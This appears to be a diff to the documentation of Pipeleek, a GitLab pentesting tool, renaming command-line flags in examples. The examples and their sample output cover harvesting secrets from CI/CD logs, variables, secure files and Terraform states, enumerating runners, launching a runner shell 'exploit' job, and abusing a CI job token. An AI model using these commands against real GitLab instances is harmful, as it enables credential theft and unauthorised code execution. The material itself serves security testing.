@@ -33,7 +33,7 @@ Prefer the authenticated scan over the unauthenticated one whenever possible, as
 
 ```bash
 # Scan all publicly accessible CI/CD logs, including artifacts (breadth-first)
-pipeleek gluna scan -g https://leakycompany.com -a --job-limit 10
+pipeleek gluna scan -u https://leakycompany.com -a --job-limit 10
 ```
 
 ## Authenticated Access
@@ -55,7 +55,7 @@ Make sure to verify manually as well.
 > To create a Personal Access Token visit https://leakycompany.com/-/user_settings/personal_access_tokens
 
 ```bash
-pipeleek gl vuln -g https://leakycompany.com -t glpat-[redacted]
+pipeleek gl vuln -u https://leakycompany.com -t glpat-[redacted]
 2024-11-14T14:29:05+01:00 info GitLab version=17.5.1-ee
 2024-11-14T14:29:05+01:00 info Fetching CVEs for this version version=17.5.1-ee
 ```
@@ -68,16 +68,16 @@ Dump all CI/CD variables you have access to, to find more secrets.
 
 ```bash
 # Dump variables defined in the projects settings
-pipeleek gl variables -g https://leakycompany.com -t glpat-[redacted]
+pipeleek gl variables -u https://leakycompany.com -t glpat-[redacted]
 
 # Schedules can have separately defined variables
-pipeleek gl schedule -g https://leakycompany.com -t glpat-[redacted]
+pipeleek gl schedule -u https://leakycompany.com -t glpat-[redacted]
 
 # Secure files are an alternative to variables and often times contain sensitive info
-pipeleek gl secureFiles -g https://leakycompany.com -t glpat-[redacted]
+pipeleek gl secureFiles -u https://leakycompany.com -t glpat-[redacted]
 
 # Terraform states can contain secrets
-pipeleek gl tf --token -g https://leakycompany.com -t glpat-[redacted]
+pipeleek gl tf -u https://leakycompany.com -t glpat-[redacted]
 ```
 
 ## Secret Detection in Source Code
@@ -158,7 +158,7 @@ There are many reasons why credentials might be included in the job output. More
 [Pipeleek](https://github.com/CompassSecurity/pipeleek) can be used to scan for credentials in the job outputs.
 
 ```bash
-$ pipeleek gl scan --token glpat-[redacted] --gitlab https://gitlab.example.com -c [gitlab session cookie]]  -v -a -j 5 --confidence high-verified,high
+$ pipeleek gl scan --token glpat-[redacted] --url https://gitlab.example.com -c [gitlab session cookie]]  -v -a -j 5 --confidence high-verified,high
 2024-09-26T13:47:09+02:00 debug Verbose log output enabled
 2024-09-26T13:47:10+02:00 info Gitlab Version Check revision=2e166256199 version=17.5.0-pre
 2024-09-26T13:47:10+02:00 debug Setting up queue on disk
@@ -209,7 +209,7 @@ curl --request GET --header "PRIVATE-TOKEN: glpat-[redacted]" https://gitlab.exa
 }
 
 # Verify using Pipeleek
-pipeleek gl enum -g https://gitlab.example.com -t glpat-[redacted]
+pipeleek gl enum -u https://gitlab.example.com -t glpat-[redacted]
 2025-09-29T12:25:51Z info Enumerating User
 2025-09-29T12:25:51Z warn Current user admin=false bot=false email=test@example.com name="Pipe Leak" username=pipeleek_user
 2025-09-29T12:25:51Z info Enumerating Access Token
@@ -236,7 +236,7 @@ Runners can be attached globally, on the group level or on individual projects.
 Using pipeleek we can automate runner enumeration:
 
 ```bash
-$ pipeleek gl runners --token glpat-[redacted] --gitlab https://gitlab.example.com -v list
+$ pipeleek gl runners --token glpat-[redacted] --url https://gitlab.example.com -v list
 2024-09-26T14:26:54+02:00 info group runner description=2-green.shared-gitlab-org.runners-manager.gitlab.example.com name=comp-test-ia paused=false runner=gitlab-runner tags=gitlab-org type=instance_type
 2024-09-26T14:26:55+02:00 info group runner description=3-green.shared-gitlab-org.runners-manager.gitlab.example.com/dind name=comp-test-ia paused=false runner=gitlab-runner tags=gitlab-org-docker type=instance_type
 2024-09-26T14:26:55+02:00 info group runner description=blue-3.saas-linux-large-amd64.runners-manager.gitlab.example.com/default name=comp-test-ia paused=false runner=gitlab-runner tags=saas-linux-large-amd64 type=instance_type
@@ -250,7 +250,7 @@ Pipeleek can generate a `.gitlab-ci.yml` or directly create a project and launch
 
 ```bash
 # Manual creation
-$ pipeleek gl runners --token glpat-[redacted] --gitlab https://gitlab.example.com -v exploit --tags saas-linux-small-amd64 --shell --dry
+$ pipeleek gl runners --token glpat-[redacted] --url https://gitlab.example.com -v exploit --tags saas-linux-small-amd64 --shell --dry
 2024-09-26T14:32:26+02:00 debug Verbose log output enabled
 2024-09-26T14:32:26+02:00 info Generated .gitlab-ci.yml
 2024-09-26T14:32:26+02:00 info ---
@@ -276,7 +276,7 @@ pipeleek-job-saas-linux-small-amd64:
 2024-09-26T14:32:26+02:00 info Done, Bye Bye 🏳️‍🌈🔥
 
 # Automated
-$ pipeleek gl runners --token glpat-[redacted]  --gitlab https://gitlab.example.com -v exploit --tags saas-linux-small-amd64 --shell
+$ pipeleek gl runners --token glpat-[redacted]  --url https://gitlab.example.com -v exploit --tags saas-linux-small-amd64 --shell
 2024-09-26T14:33:48+02:00 debug Verbose log output enabled
 2024-09-26T14:33:49+02:00 info Created project name=pipeleek-runner-exploit url=https://gitlab.example.com/[redacted]/pipeleek-runner-exploit
 2024-09-26T14:33:50+02:00 info Created .gitlab-ci.yml file=.gitlab-ci.yml
@@ -415,7 +415,7 @@ docker run --rm --entrypoint sh registry.gitlab.example.com/auser/artipacked:lat
 Then validate and create PoC exploit:
 
 ```bash
-pipeleek gl jobToken exploit --project auser/artipacked --token glcbt-6c_z1CoZjUyFfAu6cE2XFTC
+pipeleek gl jobToken exploit --repo auser/artipacked --token glcbt-6c_z1CoZjUyFfAu6cE2XFTC
 2026-02-09T15:25:30Z info Job token validation succeeded
 2026-02-09T15:25:30Z info Job token context resolved job_id=13042619352 project=auser/artipacked project_id=79339419 ref=main status=running web_url=https://gitlab.example.com/auser/artipacked/-/jobs/13042619352
 2026-02-09T15:25:30Z info Fetching secure files project=auser/artipacked
